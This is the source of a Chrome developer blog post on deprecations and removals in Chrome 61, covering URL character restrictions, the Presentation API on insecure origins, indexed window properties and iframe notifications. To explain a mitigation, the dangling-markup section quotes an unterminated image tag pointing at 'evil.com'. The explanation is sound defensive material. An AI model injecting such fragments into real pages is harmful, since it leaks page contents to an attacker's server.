project_path: /web/_project.yaml
book_path: /web/updates/_book.yaml
description: A round up of the deprecations and removals in Chrome 61 to help you plan. In this version, security improvements, further webkit deprecations, and more.

{# wf_blink_components: Blink>PresentationAPI,Blink>JavaScript #}
{# wf_updated_on: 2018-01-08 #}
{# wf_published_on: 2017-08-03 #}
{# wf_tags: deprecations,removals,chrome61 #}
{# wf_featured_image: /web/updates/images/generic/warning.png #}
{# wf_featured_snippet: A round up of the deprecations and removals in Chrome 61 to help you plan. In this version, more restrictions on insecure origins and a change to the shadow-piercing descendant combinator. #}

# Deprecations and Removals in Chrome 61 {: .page-title }

{% include "web/_shared/contributors/josephmedley.html" %}

In nearly every version of Chrome, we see a significant number of updates and
improvements to the product, its performance, and also capabilities of the Web
Platform. This article describes the deprecations and removals in Chrome 61,
which is in beta as of August 3. This list is subject to change at any time.

## Security and Privacy

### Block resources whose URLs contain '\n' and '&lt;' characters.

There is a type of hacking called *dangling markup injection* in which a
truncated URL is used to send data to an external endpoint. For example,
consider a page containing `<img src='https://evil.com/?`. Because the URL has no
closing quote, browsers will read to the next quote that occurs and treat the
enclosed characters as if it were a single URL.

Chrome 61 mitigates this vulnerability by restricting the character sets
allowed in `href` and `src` attributes. Specifically, Chrome will stop
processing URLs when it encounters new line characters (`\n`) and less than
characters (`<`).

Developers with a legitimate use case for new line and less than characters in a
URL should instead escape these characters.

[Intent to Remove](https://groups.google.com/a/chromium.org/d/topic/blink-dev/KaA_YNOlTPk/discussion) &#124;
[Chromestatus Tracker](https://www.chromestatus.com/feature/5735596811091968) &#124;
[Chromium Bug](https://bugs.chromium.org/p/chromium/issues/detail?id=680970)

### Deprecate and remove Presentation API on insecure contexts

It's been found that on insecure origins, the Presentation API can be used as a
hacking vector on insecure origins. Since displays don't have address bars the
API can be used to spoof content. It's also possible to exfiltrate data from
running presentation.

In aligning with Blink’s intention to [remove powerful features on insecure
origins](https://www.chromium.org/Home/chromium-security/deprecating-powerful-features-on-insecure-origins), we plan to deprecate and
remove support for the Presentation API on insecure contexts. Starting in Chrome
61, `PresentationRequest.start()` will no longer function on insecure origins.

[Intent to Remove](https://groups.google.com/a/chromium.org/d/topic/blink-dev/lumj0lVdtHA/discussion) &#124;
[Chromestatus Tracker](https://www.chromestatus.com/feature/5766218384408576) &#124;
[Chromium Bug](https://bugs.chromium.org/p/chromium/issues/detail?id=733381)

## JavaScript

### Disallow defining of indexed properties on windows

Previously some browsers allowed for JavaScript assignments like the following:

    window[0] = 1;

The [current HTML spec
notes](https://html.spec.whatwg.org/multipage/window-object.html#windowproxy-defineownproperty)
that this is an explicit violation of
the JavaScript spec. As such, this ability is removed in Chrome 61. As of
February 2016, Firefox is already in compliance.

[Chromium Bug](https://bugs.chromium.org/p/chromium/issues/detail?id=695385)

### Remove usage of notifications from insecure iframes

Note: Removal was pushed to Chrome 62.

Permission requests from iframes can confuse users since it is difficult to
distinguish between the containing page's origin and the origin of the iframe
that is making the request. When the requests scope is unclear, it is difficult
for users to judge whether to grant or deny permission.

Disallowing notifications in iframes will also align the requirements for
notification permission with that of push notifications, easing friction for
developers.

Developers who need this functionality can open a new window to request
notification permission.

[Intent to Remove](https://groups.google.com/a/chromium.org/d/topic/blink-dev/n37ij1E_1aY/discussion) &#124;
[Chromestatus Tracker](https://www.chromestatus.com/feature/6451284559265792) &#124;
[Chromium Bug](https://bugs.chromium.org/p/chromium/issues/detail?id=695693)

{% include "web/updates/_shared/deprecations-policy.html" %}

{% include "comment-widget.html" %}
